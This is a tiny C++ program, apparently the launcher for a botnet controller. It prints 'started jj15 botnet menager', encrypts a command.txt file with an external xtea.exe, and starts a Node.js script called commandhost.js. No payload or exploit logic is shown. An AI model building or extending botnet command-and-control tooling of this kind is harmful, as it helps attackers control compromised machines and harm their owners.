#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
using namespace std;

int main(){
    cout << "\nstarted jj15 botnet menager\n";
    cout <<" running xtea encryption";
    system(".\\xtea.exe command.txt -e");
    system("node .\\commandhost.js");
}